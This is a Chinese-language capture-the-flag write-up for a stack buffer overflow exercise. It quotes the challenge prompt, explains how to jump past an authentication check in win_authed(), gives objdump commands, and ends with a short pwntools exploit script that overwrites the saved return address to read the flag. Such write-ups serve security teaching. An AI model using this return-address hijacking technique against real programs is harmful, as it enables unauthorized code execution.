# 挑战简介
```
我们的堆栈指针指向 0x7ffce9a5dd10，基指针指向 0x7ffce9a5ddb0。
这意味着我们的堆栈框架中有（十进制）22 个 8 字节字，
包括保存的基指针和保存的返回地址，
总共 176 个字节。
输入缓冲区从 0x7ffce9a5dd30 开始，位于堆栈框架的中途，
（堆栈中“上方”是函数使用的其他局部变量）。
您的输入将被读入此缓冲区。
缓冲区长度为 113 个字节，但程序会让您提供任意大的输入长度，从而溢出缓冲区。

在这个级别中，没有“win”变量。
您需要强制程序执行 win_authed() 函数，方法是直接溢出到存储的返回地址，返回到 main，该地址存储在 0x7ffce9a5ddb8，即输入缓冲区开始后的 136 个字节。
这意味着您需要输入至少 144 个字节（113 个用于填充缓冲区，23 个用于填充存储在缓冲区和返回地址之间的其他内容，8 个将覆盖返回地址）。
我们已针对此挑战禁用以下标准内存损坏缓解措施：
- 禁用 canary，否则您会在覆盖返回地址之前损坏它，程序将中止。
- 二进制文件*不是*位置无关的。这意味着每次运行时它都会位于同一位置，这意味着通过分析二进制文件（使用 objdump 或读取此输出），您可以知道覆盖返回地址所需的确切值。
您已选择发送 4096 个字节的输入！
这将允许您从 0x7ffce9a5dd30（输入缓冲区的起始位置）写入
直到（但不包括）0x7ffce9a5ed30（超出缓冲区末尾 3983 个字节）。
其中，您将覆盖 3960 个字节到返回地址。
如果该数字大于 8，您将覆盖整个返回地址。

此挑战的一个警告是 win_authed() 函数必须首先进行身份验证：
只有当您为其提供参数 0x1337 时，它才会让您获胜。
具体来说，win_authed() 函数看起来像：
void win_authed(int token)
{
if (token != 0x1337) return;
puts("您赢了！这是您的标志：");
sendfile(1, open("/flag", 0), 0, 256);
puts("");
}

那么你如何通过检查呢？有一种方法，我们稍后会介绍，但现在，我们只是绕过它！你可以用任何值覆盖返回地址（只要它指向可执行代码），而不仅仅是函数的开头。让我们在 win 中覆盖令牌检查！

为此，我们需要使用 objdump 分析程序，确定检查在 win_authed() 函数中的位置，找到检查后的地址，并将该地址写入保存的返回地址。

现在继续找到这个地址。准备好后，输入一个缓冲区溢出，它将用正确的值覆盖保存的返回地址（在 0x7ffce9a5ddb8，136 字节进入缓冲区）。

发送你的有效载荷（最多 4096 字节）！
```
# 思路
😔这题思路找错了，卡了两天，做的头脑火热...

我来说说这题意思吧

本题需注意:
- 没有win()函数，取而代之的是win_authed()函数
- win_authed()函数需要你输入参数0x1337来通过校验
- 但是你是栈溢出，所以你需要跳过栈检验，修改返回的函数地址，跳过需要检验的地址
- 你并不需要输入0x1337，只需要修改函数的返回地址

**以上**  
---
**以下**  
关于找出函数地址  
找到函数地址  
objdump -t binary_file | grep win_authed  

反汇编目标函数：  
objdump -d binary_file | less  


```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-control-hijack-2-w')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
win_authed_address = p64(0x401a37)    #此乃找到的，恰好跳过校验的地址
payload = b'a' * 136 + win_authed_address
p.send(payload)
p.recvall()
```
